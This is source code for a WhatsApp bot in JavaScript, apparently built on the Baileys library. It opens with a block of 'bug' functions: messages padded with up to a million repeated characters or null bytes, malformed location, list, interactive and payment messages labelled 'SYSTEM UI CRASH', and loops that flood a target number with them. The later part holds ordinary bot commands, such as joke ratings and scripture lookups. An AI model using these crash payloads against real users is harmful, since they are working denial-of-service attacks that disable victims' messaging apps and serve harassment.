    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await VeranBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationverany(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `VERAN VERAN VERAN VERAN VERAN`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await VeranBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function verankillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "VERANMAINA",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.imgur.com/b15GFdJ.jpeg" } }, { upload: VeranBotInc.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #VERANMAINA"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await VeranBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(target) {
await VeranBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function listveranfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "VERA "+" ".repeat(920000),
        'footerText': `VERAN VERAN VERAN VERAN VERAN`,
        'description': `VERAN VERAN VERAN VERAN VERAN `,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickveran });
await VeranBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   VeranBotInc.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    VeranBotInc.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await VeranBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await VeranBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await VeranBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  VeranBotInc.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  VeranBotInc.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return VeranBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return VeranBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}
//======end bug functions========\\

		switch(isCommand) {
			case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
case 'handsomecheck':{
				if (!text) return replygcveran(`Tag Someone, Example : ${prefix + command} @VTH`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: m.sender, 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
					break
case 'beautifulcheck':{
				if (!text) return replygcveran(`Tag Someone, Example : ${prefix + command} @Veran`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*${command}*\n\nName : ${q}\nAnswer : *${tik}%*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
					break
					case 'charactercheck':{
					if (!text) return replygcveran(`Tag Someone, Example : ${prefix + command} @Veran`)
					const verany =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = verany[Math.floor(Math.random() * verany.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Character Check : ${q}\nAnswer : *${taky}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁 \",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
				     break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await VeranBotInc.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
			case 'rentbot':
                replygcveran(`Type ${prefix}owner and chat him`)
                break
      case 'idgroup': case 'idgc': case 'groupid': {
if (!VeranTheCreator) return VeranStickOwner()
let getGroups = await VeranBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await VeranBotInc.groupMetadata(x)
teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
replygcveran(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`)
}
break
case 'repo': case 'repository': {
  try {
    const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
    const response = await axios.get(`https://api.github.com/repos/${username}/${repoName}`)
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = `
✨ *Repository Name:* _${repoData.name}_
📄 *Description:* _${repoData.description || 'No description provided.'}_
👤 *Owner:* _${repoData.owner.login}_
⭐ *Stars:* _${repoData.stargazers_count}_
🍴 *Forks:* _${repoData.forks_count}_
🔗 *URL:* ${repoData.html_url}
      `.trim()
      await VeranBotInc.relayMessage(m.chat, {
        requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: 69000,
          requestFrom: m.sender,
          noteMessage: {
            extendedTextMessage: {
              text: formattedInfo,
              contextInfo: {
                externalAdReply: {
                  showAdAttribution: true
                }
              }
            }
          }
        }
      }, { quoted: m })
    } else {
      await replygcveran(`Unable to fetch repository information`)
    }
  } catch (error) {
    console.error(error)
    await replygcveran(`Repository currently not available`)
  }
}
break

			case 'myip':
            case 'ipbot':
                if (!VeranTheCreator) return VeranStickOwner()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replygcveran("🔎 My public IP address is: " + ip);
                    })
                })
            break
            case 'request': case 'reportbug': case 'bugreport': {
	if (!text) return replygcveran(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${m.pushName},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
                VeranBotInc.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            VeranBotInc.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
			case 'socialmedia': 
        case 'sosmed': 
        case 'update':{
	const slides = [
    [
        'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png', // Image URL
        '', // Title
        `Susbcribe Developer's YouTube Channel To Get Updates`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://wa.me/+2347082664317', // Command (URL in this case)
        'cta_url', // Button type
        'https://wa.me/+2347082664317' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/1024px-Telegram_2019_Logo.svg.png', // Image URL
        '', // Title
        `Susbcribe Developer's Telegram Channel To Get Updates`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://t.me/Tickic', // Command (URL in this case)
        'cta_url', // Button type
        'https://t.me/Tickic' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/360px-GitHub_Invertocat_Logo.svg.png', // Image URL
        '', // Title
        `Follow Developer On GitHub`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://github.com/Veran350', // Command (URL in this case)
        'cta_url', // Button type
        'https://github.com/Veran350' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/264px-Instagram_logo_2016.svg.png', // Image URL
        '', // Title
        `Follow Developer On Instagram`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://www.instagram.com/unicorn_veran13', // Command (URL in this case)
        'cta_url', // Button type
        'https://www.instagram.com/unicorn_veran13' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png', // Image URL
        '', // Title
        `Contact Developer On WhatsApp`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://Wa.me/2347082664317', // Command (URL in this case)
        'cta_url', // Button type
        'https://Wa.me/2347082664317' // URL (used in image generation)
    ], 
];

const sendSlide = async (jid, title, message, footer, slides) => {
    const cards = slides.map(async slide => {
        const [
            image,
            titMess,
            boMessage,
            fooMess,
            textCommand,
            command,
            buttonType,
            url,
        ] = slide;
        let buttonParamsJson = {};
        switch (buttonType) {
            case "cta_url":
                buttonParamsJson = {
                    display_text: textCommand,
                    url: url,
                    merchant_url: url,
                };
                break;
            case "cta_call":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "cta_copy":
                buttonParamsJson = {
                    display_text: textCommand,
                    id: "",
                    copy_code: command,
                };
                break;
            case "cta_reminder":
            case "cta_cancel_reminder":
            case "address_message":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "send_location":
                buttonParamsJson = {};
                break;
             case "quick_reply":
             buttonParamsJson = { display_text: textCommand, id: command };
             break;
            default:
                break;
        }
        const buttonParamsJsonString = JSON.stringify(buttonParamsJson);
        return {
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: boMessage,
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: fooMess,
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: titMess,
                hasMediaAttachment: true,
                ...(await prepareWAMessageMedia(
                    { image: { url: image } },
                    { upload: VeranBotInc.waUploadToServer },
                )),
            }),
            nativeFlowMessage:
                proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [
                        {
                            name: buttonType,
                            buttonParamsJson: buttonParamsJsonString,
                        },
                    ],
                }),
        };
    });
    
    const msg = generateWAMessageFromContent(
        jid,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: message,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.fromObject({
                            text: footer,
                        }),
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            title: title,
                            subtitle: title,
                            hasMediaAttachment: false,
                        }),
                        carouselMessage:
                            proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: await Promise.all(cards),
                            }),
                            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
                    }),
                },
            },
        },
        { quoted: m},
    );
    await VeranBotInc.relayMessage(jid, msg.message, {
        messageId: msg.key.id,
    });
};
// Call the function with example parameters
sendSlide(m.chat, 'removed you', ownername, botname, slides);
}
break
			case 'gita-verse': case 'gita': case 'bhagavatgita': {
	try {
    // Extract the verse number from the command text.
    let verseNumber = m.text.split(' ')[1]
    if (!verseNumber || isNaN(verseNumber)) {
      verseNumber = Math.floor(Math.random() * 700) + 1
    }
    let res = await fetch(`https://gita-api.vercel.app/odi/verse/${verseNumber}`)
    if (!res.ok) {
      let error = await res.json()
      throw new Error(
        `API request failed with status ${res.status} and message ${error.detail[0].msg}`
      )
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let gitaVerse = `
🕉 *Bhagavad Gita: Sacred Teachings*\n
📜 *Chapter ${json.chapter_no}: ${json.chapter_name}*\n
Verse ${json.verse_no}:\n
" ${json.verse} "\n
*🔮 Translation:*\n
${json.translation}\n
*🧘‍♂️ Spiritual Insight (Purport):*\n
${json.purport}`
    replygcveran(gitaVerse)
    if (json.audio_link) {
      VeranBotInc.sendMessage(m.chat, {audio: {url:json.audio_link}, mimetype: 'audio/mp4', ptt: true}, {quoted:m})
    }
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
}
break

			case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

    replygcveran(quranSurah)

    if (json.data.recitation.full) {
      VeranBotInc.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    replygcveran(`Error: ${error.message}`)
  }
  }
  break
			case 'animequote': {
  try {
    const res = await fetch('https://some-random-api.com/animu/quote');
    if (!res.ok) throw await res.text()
    const json = await res.json()
    const { sentence, character, anime } = json
    const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
  }
  }
  break
  case 'bible': {
  	const { translate } = require('@vitalets/google-translate-api')
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bibleChapter
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🙏\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    replygcveran(`Error: ${error.message}`)
  }
  }
  break


//------------------------------------------------------------------------------------------//
//New Islam Cmds

case 'namazchk': {
  const prayers = ['Fajr', 'Zuhr', 'Asr', 'Maghrib', 'Isha'];

  // Initialize tracking arrays if not already done
  if (!VeranBotInc.askedPrayers) {
      VeranBotInc.askedPrayers = [];
  }
  if (!VeranBotInc.prayerResults) {
      VeranBotInc.prayerResults = [];
  }

  // Ask the first unasked prayer
  let currentPrayerIndex = VeranBotInc.askedPrayers.length;
  if (currentPrayerIndex < prayers.length) {
      let currentPrayer = prayers[currentPrayerIndex];

      let button = [{
          name: 'single_select',
          buttonParamsJson: {
              title: `Did you pray ${currentPrayer}?`,
              sections: [{
                  title: `${currentPrayer.toUpperCase()} PRAYER`,
                  rows: [
                      { title: 'Yes', description: `I have prayed ${currentPrayer}`, id: `${prefix} yes ${currentPrayer.toLowerCase()}` },
                      { title: 'No', description: `I haven't prayed ${currentPrayer}`, id: `${prefix} no ${currentPrayer.toLowerCase()}` },
                  ]
              }]
          }
      }];

      await VeranBotInc.sendButtonMsg(m.chat, `*Did you pray ${currentPrayer}?*`, null, '*Please choose:*', null, button, m);
  } else {
      // Calculate the results
